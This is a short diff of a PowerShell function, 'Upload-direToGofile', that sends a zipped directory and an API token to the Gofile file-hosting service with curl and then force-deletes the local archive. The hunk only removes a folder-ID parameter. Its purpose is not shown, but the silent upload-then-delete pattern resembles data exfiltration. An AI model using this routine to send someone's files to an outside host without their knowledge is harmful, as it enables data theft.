@@ -20,7 +20,7 @@ function Upload-direToGofile {
 
         
         
-        curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
+        curl.exe -F "file=@$zipPath" -F "token=$ApiKey" $uploadUri
         Start-Sleep -Milliseconds 30
         Remove-Item $zipPath -Force
         
